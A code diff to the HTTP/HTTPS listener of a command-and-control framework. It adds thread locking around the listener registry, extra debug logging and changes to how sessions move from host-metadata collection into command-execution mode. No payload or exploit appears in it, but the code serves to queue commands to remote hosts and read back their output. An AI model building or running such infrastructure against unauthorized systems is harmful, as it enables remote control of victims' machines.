@@ -16,7 +16,7 @@ from socketserver import ThreadingMixIn
 import logging
 logger = logging.getLogger(__name__)
 
-from core.listeners.base import Listener, register_listener, socket_to_listener, listeners as listener_registry
+from core.listeners.base import Listener, _reg_lock, register_listener, socket_to_listener, listeners as listener_registry
 from core import utils
 from core.session_handlers import session_manager
 from core.session_handlers.session_manager import kill_http_session
@@ -100,8 +100,9 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 	def do_GET(self):
 		try:
-			lid = socket_to_listener.get(self.server.socket.fileno())
-			listener = listener_registry[lid]
+			with _reg_lock:
+				lid = socket_to_listener.get(self.server.socket.fileno())
+				listener = listener_registry[lid]
 			profile = self._select_profile(listener)
 			#print(f"RAW REQUEST: {self.requestline}")
 
@@ -152,9 +153,10 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 				session = session_manager.sessions[sid]
 
-				lid = socket_to_listener.get(self.server.socket.fileno())
-				if lid:
-					listener_registry[lid].sessions.append(sid)
+				with _reg_lock:
+					lid = socket_to_listener.get(self.server.socket.fileno())
+					if lid:
+						listener_registry[lid].sessions.append(sid)
 
 				# queue up your commands exactly as before…
 				try:
@@ -266,9 +268,10 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 				session = session_manager.sessions[sid]
 
-				lid = socket_to_listener.get(self.server.socket.fileno())
-				if lid:
-					listener_registry[lid].sessions.append(sid)
+				with _reg_lock:
+					lid = socket_to_listener.get(self.server.socket.fileno())
+					if lid:
+						listener_registry[lid].sessions.append(sid)
 			
 				try:
 					cmd_b64 = session.meta_command_queue.get_nowait()
@@ -326,8 +329,9 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 	def do_POST(self):
 		try:
-			lid      = socket_to_listener.get(self.server.socket.fileno())
-			listener = listener_registry[lid]
+			with _reg_lock:
+				lid      = socket_to_listener.get(self.server.socket.fileno())
+				listener = listener_registry[lid]
 
 			# dynamically pick profile per-request
 			profile = self._select_profile(listener)
@@ -440,9 +444,11 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 							#print(brightred + f"[!] Failed to execute metadata collecting commands!")
 
 						else:
+							logger.debug("About to set execution mode to cmd")
 							session.mode = "cmd"
 							last_mode = "cmd"
 							session.collection = 1
+							logger.debug("Set execution mode to cmd")
 
 					elif last_mode == "cmd":
 						if output_b64:
@@ -549,6 +555,7 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					if host: session.metadata["hostname"] = host"""
 
 					# Handle OS detection first
+					logger.debug(f"MODE {session.mode}")
 					last_mode = session.last_cmd_type
 					if last_mode == "meta":
 						if session.mode == "detect_os":
@@ -567,11 +574,20 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 							self.end_headers()
 							return
 
+						"""if session.metadata_stage == 3:
+							session.metadata_stage += 1"""
+
 						# Handle metadata collection
 						if session.metadata_stage == 2:
 							session.metadata_stage += 1
+							session.mode = "cmd"
+
+
+
+						#logger.debug(brightred + f"MODE: {session.mode}, stage: {session.metadata_stage}, field: {session.metadata_fields[session.metadata_stage]}")
 
 						if session.metadata_stage < len(session.metadata_fields):
+							logger.debug(brightred + f"METADATA STAGE IS LESS THAN FIELDS, stage: {session.metadata_stage}, field: {session.metadata_fields[session.metadata_stage]}")
 							field = session.metadata_fields[session.metadata_stage]
 							lines = [
 								line.strip()
@@ -591,12 +607,13 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 							else:
 								pass
-							#print(brightred + f"[!] Failed to execute metadata collecting commands!")
 
 						else:
+							logger.debug("About to set execution mode to cmd")
 							session.mode = "cmd"
 							last_mode = "cmd"
 							session.collection = 1
+							logger.debug("Set execution mode to cmd")
 
 					elif last_mode == "cmd":
 						if output_b64:
@@ -621,6 +638,7 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 				except Exception as e:
 					print(f"error: {e}")
+					logger.debug(brightred + f"ERROR IN HTTP POST FUNCTION {e}")
 					print("HIT 400 ERROR")
 					self.send_response(400)
 					self.end_headers()
@@ -667,12 +685,14 @@ class HttpListener(Listener):
 		self.server.scheme = self.transport  # so handler knows http vs https
 
 		if self.transport == "http":
-			utils.http_listener_sockets[f"http-{ip}:{port}"] = self.server
-			socket_to_listener[ self.server.socket.fileno() ] = self.id
+			with _reg_lock:
+				utils.http_listener_sockets[f"http-{ip}:{port}"] = self.server
+				socket_to_listener[ self.server.socket.fileno() ] = self.id
 
 		else:
-			utils.https_listener_sockets[f"https-{ip}:{port}"] = self.server
-			socket_to_listener[ self.server.socket.fileno() ] = self.id
+			with _reg_lock:
+				utils.https_listener_sockets[f"https-{ip}:{port}"] = self.server
+				socket_to_listener[ self.server.socket.fileno() ] = self.id
 
 		# if HTTPS, wrap
 		if self.is_ssl:
